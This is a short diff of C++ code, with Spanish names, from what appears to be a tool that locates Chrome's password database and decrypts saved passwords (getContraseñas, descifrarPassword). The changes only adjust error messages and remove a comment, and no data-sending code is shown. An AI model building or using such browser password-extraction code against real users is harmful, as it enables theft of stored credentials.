@@ -23,7 +23,6 @@ char* Chrome::getRutaBD() {
 	int size = strlen(rutaLAD) + 1;
 	char* ret = (char*)calloc(size, 1);
 	memcpy(ret, rutaLAD, size);
-	//delete[]szProfileFolderPath;
 	return ret;
 
 }
@@ -59,6 +58,7 @@ char* Chrome::getContraseñas(char* rutaBD) {
 	}
 	else {
 		cout << "No se ha podido conectar con la base de datos" << endl;
+		info += "Error al encontrar la base de datos en chrome, posiblemente no está instalado";
 	}
 
 	//Return char* limpio
@@ -89,5 +89,5 @@ const char* Chrome::descifrarPassword(BYTE * password, int size)
 		out.pbData[out.cbData] = 0; // '\0' en la posición final del string 
 		return ((const char*)out.pbData);
 	}
-	return ("Error not found\n");
+	return ("Error \n");
 }
